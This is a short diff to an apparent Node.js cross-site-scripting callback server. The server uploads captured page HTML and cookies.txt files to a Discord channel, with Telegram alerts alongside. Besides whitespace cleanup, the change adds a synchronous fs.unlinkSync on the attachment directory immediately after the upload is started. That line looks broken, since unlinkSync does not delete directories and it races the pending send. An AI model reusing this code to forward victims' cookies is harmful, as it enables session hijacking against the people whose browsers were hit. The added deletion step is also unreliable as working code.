@@ -35,8 +35,8 @@ if(discord_notification){
       GatewayIntentBits.MessageContent,
     ],
   });
-  
-  client.login(discord_token); 
+
+  client.login(discord_token);
 }
 
 const app = express();
@@ -163,6 +163,8 @@ function send_to_discord(messageContent, attachment_path = null) {
         files: [`${attachment_path}/dom.html`, `${attachment_path}/cookies.txt`]
       }).then(sentAttachment => console.log("Attachment sent!"))
       .catch(error => console.error("Error sending message: " + error));
+
+      fs.unlinkSync(`${attachment_path}`);
     }
   } else {
     console.error(`Channel with ID ${discord_channel_id} not found.`);
@@ -177,7 +179,7 @@ function send_notification(data, attachment_path = null){
   if(telegram_notification){
     send_to_telegram(data)
   }
-  
+
   if(discord_notification){
     send_to_discord(data, attachment_path)
   }
